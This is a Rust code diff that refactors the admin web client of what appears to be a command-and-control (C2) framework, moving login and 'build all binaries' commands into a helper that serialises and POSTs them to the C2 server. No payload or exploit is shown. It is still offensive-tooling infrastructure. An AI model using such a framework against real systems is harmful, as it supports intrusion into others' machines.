@@ -1,8 +1,9 @@
-use gloo_net::http::Request;
+use gloo_net::http::{Request, Response};
 use leptos::prelude::window;
+use serde_json::Value;
 use shared::{
     net::{ADMIN_ENDPOINT, ADMIN_HEALTH_CHECK_ENDPOINT, ADMIN_LOGIN_ENDPOINT, AdminLoginPacket},
-    tasks::AdminCommand,
+    tasks::{AdminCommand, BaBData},
 };
 use thiserror::Error;
 use web_sys::RequestCredentials;
@@ -91,27 +92,8 @@ pub async fn api_request(
     // Send the HTTP request to the C2
     //
 
-    let resp = match command {
-        AdminCommand::Login => {
-            let admin_creds = AdminLoginPacket {
-                username: creds.clone().unwrap().0,
-                password: creds.unwrap().1.clone(),
-            };
-
-            Request::post(&c2_url)
-                .credentials(RequestCredentials::Include)
-                .json(&admin_creds)?
-                .send()
-                .await?
-        }
-        _ => {
-            Request::post(&c2_url)
-                .credentials(RequestCredentials::Include)
-                .json(&command)?
-                .send()
-                .await?
-        }
-    };
+    let post_body_data = prepare_body_data(command, creds);
+    let resp = make_post(&c2_url, post_body_data).await?;
 
     // Note, all admin commands return ACCEPTED (status 202) on successful authentication / completion
     // not the anticipated 200 OK. Dont recall why I went that route, but here we are :)
@@ -124,6 +106,39 @@ pub async fn api_request(
 
     let bytes = resp.binary().await?;
     Ok(bytes.to_vec())
+}
+
+/// Prepare the POST request body data by serialising the input to an expected JSON value which
+/// the C2 will expect.
+///
+/// For some C2  API's, the JSON body is expected to be of a certain type, so this ensures we sent the correct
+/// type to the C2. If no such exact type is required (e.g. the data is included in the [`AdminCommand`]) then it will
+/// just prepare that as-is without converting to another expected type.
+///
+/// # Returns
+/// The function returns a [`serde_json::Value`] of the body data.
+fn prepare_body_data(input: AdminCommand, creds: Option<(String, String)>) -> Value {
+    match input {
+        AdminCommand::Login => serde_json::to_value(AdminLoginPacket {
+            username: creds.clone().unwrap().0,
+            password: creds.unwrap().1.clone(),
+        })
+        .unwrap(),
+        AdminCommand::BuildAllBins(data) => {
+            serde_json::to_value(BaBData::from(data.0.clone())).unwrap()
+        }
+        _ => serde_json::to_value(input).unwrap(),
+    }
+}
+
+async fn make_post(c2_url: &str, body: Value) -> Result<Response, ApiError> {
+    let r = Request::post(c2_url)
+        .credentials(RequestCredentials::Include)
+        .json(&body)?
+        .send()
+        .await?;
+
+    Ok(r)
 }
 
 fn construct_c2_url(
